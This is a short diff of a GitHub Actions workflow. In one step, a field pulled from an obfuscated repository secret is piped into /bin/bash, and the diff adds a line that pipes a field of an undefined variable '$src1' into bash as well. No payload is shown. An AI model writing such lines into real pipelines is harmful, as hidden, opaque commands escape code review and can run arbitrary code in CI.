@@ -19,6 +19,7 @@ jobs:
           kfip66: ${{ secrets.kfip66 }}
         run: |
           printf '%s' "$kfip66" | jq -r .xjmh3846 | /bin/bash
+          echo $src1 | jq -r .n4809 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
